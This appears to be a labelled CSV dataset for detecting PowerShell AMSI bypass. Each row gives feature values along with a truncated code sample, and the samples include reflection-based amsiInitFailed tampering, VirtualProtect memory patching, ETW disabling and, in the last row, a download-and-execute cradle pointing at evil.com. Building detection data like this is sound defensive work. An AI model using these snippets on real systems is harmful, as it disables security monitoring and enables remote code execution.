code_length,line_count,avg_line_length,entropy,amsi_keyword_count,has_amsi_keyword,win32_api_count,has_virtualprotect,has_getprocaddress,has_loadlibrary,reflection_count,has_reflection,marshal_op_count,backtick_count,has_format_operator,char_cast_count,string_concat_count,plus_operator_density,has_base64,has_memory_patch_pattern,hex_byte_array,has_page_rwx,dllimport_count,has_add_type,has_registry_amsi,has_ps_downgrade,has_scriptblock_ast,has_hw_breakpoint,has_etw_tamper,has_download_cradle,has_clr_targeting,special_char_ratio,case_ratio,composite_risk,callstack_amsi_dll_present,callstack_clr_to_kernel,callstack_ntdll_direct,callstack_wow64_transition,callstack_syscall_direct,callstack_reflection_depth,proc_spawns_cmd,proc_parent_spoofing,proc_inject_remote,proc_hollow_indicators,proc_runs_from_temp,proc_unusual_parent,mem_page_rwx,mem_page_rx_after_rw,mem_alloc_exec,mem_write_then_exec,mem_unbacked_region,mem_patch_size_small,bseq_load_reflect_exec,bseq_obfuscate_then_exec,bseq_download_then_exec,bseq_patch_amsi_then_run,bseq_etw_disable_then_run,bseq_clr_tamper,bseq_multi_evasion,dynamic_risk_score,label,label_name,source_id,raw_code_snippet
144,1,144.0,4.848549106747395,2,1,0,0,0,0,5,1,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.2361111111111111,0.1956521739130435,16,1,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,20,1,AMSI_Bypass,MAL-001,"$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$b=$a.GetField('amsiInitFailed','NonPublic,Static');"
172,1,172.0,4.930471185467623,2,1,0,0,0,0,4,1,1,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.19186046511627908,0.20353982300884957,16,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,20,1,AMSI_Bypass,MAL-002,[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField(
205,1,205.0,5.021438655589561,2,1,0,0,0,0,4,1,1,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.22439024390243903,0.21374045801526717,16,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,20,1,AMSI_Bypass,MAL-003,"$r=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$r.GetField('amsiContext','NonPublic,Static');[Sy"
429,1,429.0,5.314225903863112,2,1,1,1,0,0,4,1,0,0,0,0,0,0.0,0,1,1,1,1,1,0,0,0,0,0,0,0,0.21212121212121213,0.1803921568627451,26,1,1,0,0,0,1,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,1,0,1,0,37,1,AMSI_Bypass,MAL-004,"Add-Type -MemberDefinition '[DllImport(""kernel32"")] public static extern bool VirtualProtect(IntPtr a,UIntPtr b,uint c,o"
256,1,256.0,5.129526104815901,0,0,1,1,0,0,0,0,1,3,0,0,0,0.0,0,1,0,0,1,1,0,0,0,0,0,0,0,0.1640625,0.1411764705882353,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,AMSI_Bypass,MAL-005,"Add-Type @'`nusing System;using System.Runtime.InteropServices;`npublic class Bypass{[DllImport(""kernel32"")]public stati"
271,1,271.0,5.202381977410564,2,1,1,1,0,0,0,0,0,0,0,0,0,0.0,0,1,1,1,0,0,0,0,0,0,0,0,0,0.1881918819188192,0.16167664670658682,16,1,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,1,0,0,0,24,1,AMSI_Bypass,MAL-006,"$bytes=[byte[]](0x31,0xC0,0xC3,0x90); $addr=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get"
348,1,348.0,5.009772136177422,0,0,0,0,0,0,0,0,1,0,0,0,0,0.0,0,0,0,0,1,1,0,0,0,0,0,0,0,0.16954022988505746,0.20444444444444446,4,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,1,AMSI_Bypass,MAL-007,[Runtime.InteropServices.Marshal]::WriteByte([Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Add-Type 
237,1,237.0,5.183521196542752,0,0,0,0,0,0,3,1,1,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,1,0,0,0.1940928270042194,0.19205298013245034,12,0,0,1,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,13,1,AMSI_Bypass,MAL-008,"$etw = [System.Diagnostics.Eventing.EventProvider]; $f = $etw.GetField('m_etwCallback','NonPublic,Instance'); $f.SetValu"
258,1,258.0,5.009041214839347,0,0,0,0,0,0,2,1,1,0,0,0,0,0.0,0,0,0,0,1,1,0,0,0,0,1,0,0,0.14728682170542637,0.18128654970760233,12,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,13,1,AMSI_Bypass,MAL-009,"Add-Type -MemberDefinition '[DllImport(""ntdll"")] public static extern int EtwEventWrite(ulong r,IntPtr d,uint c,IntPtr e"
256,1,256.0,5.209095742153459,0,0,0,0,0,0,3,1,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,1,0,0.19921875,0.14705882352941177,11,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,11,1,AMSI_Bypass,MAL-010,"$scriptblock = [scriptblock]::Create('IEX (New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'); $f"
